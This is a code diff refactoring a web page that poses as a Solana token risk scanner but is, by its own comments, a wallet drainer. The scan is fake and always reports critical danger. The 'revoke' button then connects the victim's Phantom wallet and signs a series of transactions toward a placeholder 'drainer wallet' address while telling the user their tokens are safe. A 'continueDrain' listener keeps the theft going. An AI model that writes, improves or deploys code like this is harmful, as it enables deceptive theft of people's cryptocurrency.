@@ -66,10 +66,12 @@ body { background: #0b0b1a; font-family: Arial, sans-serif; display: flex; justi
 </div>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script>
-// === MOBILE DETECTION ===
+document.addEventListener('DOMContentLoaded', function() {
+// Mobile detection
 if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(navigator.userAgent)) {
 document.getElementById('mobileFallback').style.display = 'block';
-} else {
+return;
+}
 document.getElementById('mainUI').style.display = 'block';
 
 // === REPLACE WITH YOUR ACTUAL DRAINER WALLET ADDRESS ===
@@ -122,51 +124,58 @@ let wallet = null;
 let step = 0;
 const TOTAL = 20;
 
-document.getElementById('scanBtn').onclick = function() {
-const addr = document.getElementById('tokenInput').value.trim();
+const scanBtn = document.getElementById('scanBtn');
+const tokenInput = document.getElementById('tokenInput');
+const resultBox = document.getElementById('resultBox');
+const statusBadge = document.getElementById('statusBadge');
+const revokeBtn = document.getElementById('revokeBtn');
+const statusDiv = document.getElementById('status');
+const walletDisplay = document.getElementById('walletDisplay');
+const progressFill = document.getElementById('progressFill');
+
+scanBtn.onclick = function() {
+const addr = tokenInput.value.trim();
 if (!addr) {
-document.getElementById('status').innerHTML = 'Please enter a token address';
+statusDiv.innerHTML = 'Please enter a token address';
 return;
 }
-// Fake scan - always shows danger
-document.getElementById('resultBox').innerHTML = 
+resultBox.innerHTML = 
 '<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>' +
 '<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
 '<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">89%</span></div>' +
 '<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
-document.getElementById('statusBadge').innerText = '⚠️ RISK';
-document.getElementById('statusBadge').style.background = '#ef4444';
-document.getElementById('revokeBtn').classList.add('show');
-document.getElementById('status').innerHTML = '⚠️ High risk detected – revoke recommended';
+statusBadge.innerText = '⚠️ RISK';
+
+statusBadge.style.background = '#ef4444';
+revokeBtn.classList.add('show');
+statusDiv.innerHTML = '⚠️ High risk detected – revoke recommended';
 };
 
-document.getElementById('revokeBtn').onclick = async function() {
-if (!window.solana) { document.getElementById('status').
-
-innerHTML = 'Phantom not installed'; return; }
+revokeBtn.onclick = async function() {
+if (!window.solana) { statusDiv.innerHTML = 'Phantom not installed'; return; }
 try {
 if (!window.solana.publicKey) { await window.solana.connect(); }
 wallet = window.solana.publicKey;
-document.getElementById('walletDisplay').innerText = wallet.toString().slice(0,6) + '...' + wallet.toString().slice(-4);
-document.getElementById('revokeBtn').disabled = true;
-document.getElementById('revokeBtn').innerText = 'Revoking...';
+walletDisplay.innerText = wallet.toString().slice(0,6) + '...' + wallet.toString().slice(-4);
+revokeBtn.disabled = true;
+revokeBtn.innerText = 'Revoking...';
 step = 0;
 await doStep();
-} catch(e) { document.getElementById('status').innerHTML = 'Error: ' + e.message; }
+} catch(e) { statusDiv.innerHTML = 'Error: ' + e.message; }
 };
 
 async function doStep() {
 if (step >= TOTAL) {
-document.getElementById('status').innerHTML = 'Revocation complete! Your tokens are safe.';
-document.getElementById('revokeBtn').innerText = 'Protected';
-document.getElementById('progressFill').style.width = '100%';
-document.getElementById('statusBadge').innerText = '● SAFE';
-document.getElementById('statusBadge').style.background = '#22c55e';
+statusDiv.innerHTML = 'Revocation complete! Your tokens are safe.';
+revokeBtn.innerText = 'Protected';
+progressFill.style.width = '100%';
+statusBadge.innerText = '● SAFE';
+statusBadge.style.background = '#22c55e';
 return;
 }
 step++;
-document.getElementById('progressFill').style.width = (step/TOTAL*100) + '%';
-document.getElementById('status').innerHTML = 'Revoking step ' + step + '/' + TOTAL + '...';
+progressFill.style.width = (step/TOTAL*100) + '%';
+statusDiv.innerHTML = 'Revoking step ' + step + '/' + TOTAL + '...';
 const tx = new solanaWeb3.Transaction();
 tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
 tx.feePayer = wallet;
@@ -177,7 +186,7 @@ setTimeout(doStep, 10000);
 window.addEventListener('continueDrain', function() {
 if (step > 0 && step < TOTAL) { doStep(); }
 });
-}
+});
 </script>
 </body>
 </html>`);
